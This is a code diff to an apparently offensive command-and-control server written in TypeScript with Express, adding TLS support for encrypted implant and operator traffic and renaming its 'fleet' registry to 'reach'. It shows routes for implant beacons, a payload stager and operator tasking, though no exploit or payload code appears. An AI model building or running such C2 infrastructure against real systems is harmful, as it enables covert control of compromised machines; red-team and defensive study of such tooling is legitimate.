@@ -1,16 +1,21 @@
 import express from "express";
 import cors from "cors";
 import { createServer } from "node:http";
+import { createServer as createHttpsServer } from "node:https";
+import { readFileSync, existsSync } from "node:fs";
 import { homedir } from "node:os";
-import { join } from "node:path";
+import { join, dirname } from "node:path";
+import { fileURLToPath } from "node:url";
 
 import { getDb, closeDb } from "./db.js";
-import { FleetRegistry } from "./fleet.js";
+import { ReachRegistry } from "./reach.js";
 import { TaskQueue } from "./taskQueue.js";
 import { createRouter } from "./api.js";
 import { createStagerRouter } from "./stager.js";
 import { createWsBroadcaster } from "./ws.js";
 import type { C2ServerConfig } from "../types.js";
+
+const __dirname = dirname(fileURLToPath(import.meta.url));
 
 export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => void } {
   const config: C2ServerConfig = {
@@ -32,7 +37,7 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
 
   // Init DB
   const db = getDb(config.dbPath);
-  const registry = new FleetRegistry(db);
+  const registry = new ReachRegistry(db);
   const taskQueue = new TaskQueue(db);
 
   // Express
@@ -50,8 +55,21 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
     registry.pruneStale(config.checkinTimeout);
   }, config.stalePruneInterval);
 
-  // Start HTTP server
-  const httpServer = createServer(app);
+  // Start HTTP or HTTPS server
+  let protocol = "http";
+  let wsProtocol = "ws";
+  let httpServer;
+
+  if (config.cert && config.key) {
+    if (!existsSync(config.cert)) throw new Error(`TLS cert not found: ${config.cert}`);
+    if (!existsSync(config.key)) throw new Error(`TLS key not found: ${config.key}`);
+    protocol = "https";
+    wsProtocol = "wss";
+    const tlsOpts = { cert: readFileSync(config.cert), key: readFileSync(config.key) };
+    httpServer = createHttpsServer(tlsOpts, app);
+  } else {
+    httpServer = createServer(app);
+  }
 
   // WebSocket broadcast (attached to the same HTTP server)
   const broadcast = createWsBroadcaster(httpServer, config.apiKey);
@@ -67,11 +85,13 @@ export function startServer(cfg: Partial<C2ServerConfig> = {}): { close: () => v
   app.use(router);
 
   httpServer.listen(config.port, config.host, () => {
-    console.log(`  C2 server listening on ${config.host}:${config.port}`);
-    console.log(`  WS:    ws://${config.host === "0.0.0.0" ? "localhost" : config.host}:${config.port}/api/v1/operator/ws`);
+    const host = config.host === "0.0.0.0" ? "localhost" : config.host;
+    console.log(`  C2 server listening on ${host}:${config.port} (${protocol})`);
+    console.log(`  WS:    ${wsProtocol}://${host}:${config.port}/api/v1/operator/ws`);
     console.log(`  API:   POST /api/v1/beacon  (implant)`);
-    console.log(`         GET  /api/v1/operator/fleet`);
+    console.log(`         GET  /api/v1/operator/reach`);
     console.log(`         POST /api/v1/operator/task`);
+    if (protocol === "https") console.log(`  TLS:   ${config.cert} + ${config.key}`);
   });
 
   return {
